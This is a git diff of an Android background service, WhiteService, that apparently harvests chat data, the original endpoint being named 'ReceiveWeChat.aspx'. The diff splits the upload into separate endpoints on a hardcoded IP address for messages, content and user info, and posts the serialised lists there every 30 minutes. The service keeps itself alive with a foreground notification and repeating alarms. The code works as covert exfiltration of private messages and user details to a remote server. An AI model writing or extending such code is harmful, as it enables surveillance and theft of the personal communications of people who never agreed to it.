@@ -41,7 +41,12 @@ public class WhiteService extends Service {
 
     private final static String TAG = WhiteService.class.getSimpleName();
 
-    private static final String urlPath = "http://113.105.55.205:8090/UpData/ReceiveWeChat.aspx";
+    private static final String ContentUrlPath =
+            "http://113.105.55.205:8090/UpData/ReceiveContent.aspx";
+    private static final String MessageUrlPath =
+            "http://113.105.55.205:8090/UpData/ReceiveMessage.aspx";
+    private static final String UserInfoUrlPath =
+            "http://113.105.55.205:8090/UpData/ReceiveUserInfo.aspx";
 
     private final static int FOREGROUND_ID = 1000;
     private List<MessageInfo> mMessageInfos;
@@ -93,9 +98,9 @@ public class WhiteService extends Service {
                         mJsonContent = JsonUtil.toJson(mContentInfos);
                         mJsonUser = JsonUtil.toJson(mUserInfos);
 
-                        postJson(mJsonMessage);
-                        postJson(mJsonContent);
-                        postJson(mJsonUser);
+                        postJson(MessageUrlPath,mJsonMessage);
+                        postJson(ContentUrlPath,mJsonContent);
+                        postJson(UserInfoUrlPath,mJsonUser);
 
                         mMessageInfos.clear();
                         mContentInfos.clear();
@@ -113,7 +118,7 @@ public class WhiteService extends Service {
             }
         }).start();
         AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
-        int anHour = 60 * 1000; // 60秒
+        int anHour = 60 * 1000 * 30; // 30分钟
         long triggerAtTime = SystemClock.elapsedRealtime() + anHour;
         Intent activityIntent = new Intent(this, AlarmReceiver.class);
         PendingIntent pi = PendingIntent.getBroadcast(this, 0, activityIntent, 0);
@@ -125,12 +130,12 @@ public class WhiteService extends Service {
 
     }
 
-    private void postJson(String s) {
+    private void postJson(String url,String s) {
         MediaType JSON = MediaType.parse("application/json; charset=utf-8");
         OkHttpClient client = new OkHttpClient();//创建okhttp实例
         RequestBody body=RequestBody.create(JSON,s);
         Request request = new Request.Builder()
-                .url(urlPath)
+                .url(url)
                 .post(body)
                 .build();
         okhttp3.Call call = client.newCall(request);
